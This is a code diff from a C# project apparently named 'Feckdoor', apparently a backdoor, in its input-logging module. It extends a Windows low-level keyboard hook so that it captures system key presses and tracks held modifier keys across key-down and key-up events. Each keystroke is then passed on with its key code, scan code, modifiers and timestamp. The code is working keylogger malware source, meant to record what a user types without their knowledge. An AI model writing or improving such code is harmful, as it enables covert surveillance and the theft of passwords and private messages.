@@ -12,6 +12,8 @@ namespace Feckdoor.InputLog
 
 		public static event EventHandler<KeyboardInputEventArgs>? OnKeyboardInput;
 
+		private static int ActiveModifiers = 0;
+
 		/// <summary>
 		/// To prevent callback from being garbage collected
 		/// </summary>
@@ -30,19 +32,27 @@ namespace Feckdoor.InputLog
 
 		private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, ref User32.KBDLLHOOKSTRUCT lParam)
 		{
-			if (nCode >= 0 && wParam == (IntPtr)User32.WM_KEYDOWN)
+			if (nCode >= 0)
 			{
-				try
+				if (wParam == (IntPtr)User32.WM_KEYDOWN || wParam == (IntPtr)User32.WM_SYSKEYDOWN)
 				{
-					ModifierKey modifier = MkHelper.GetActiveModifierKeys();
-					if (lParam.flags.HasFlag(User32.LLKHF.ALTDOWN))
-						modifier |= ModifierKey.Alt;
+					try
+					{
+						OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs(lParam.vkCode, lParam.scanCode, (ModifierKey)ActiveModifiers, lParam.time));
+					}
+					catch (Exception e)
+					{
+						Log.Fatal(e, "Exception on keyboard hook event.");
+					} // trunc
 
-					OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs(lParam.vkCode, lParam.scanCode, modifier, lParam.time));
+					int? modifier = (int?)((VirtualKey)lParam.vkCode).GetModifier();
+					if (modifier != null)
+						ActiveModifiers |= (int)modifier;
+					Log.Information("Modifiers: {0}", (ModifierKey)ActiveModifiers);
 				}
-				catch (Exception e)
+				else if (wParam == (IntPtr)User32.WM_KEYUP || wParam == (IntPtr)User32.WM_SYSKEYUP)
 				{
-					Log.Fatal(e, "Exception on keyboard hook event.");
+					ActiveModifiers &= ~(int)(((VirtualKey)lParam.vkCode).GetModifier() ?? 0);
 				}
 			}
 
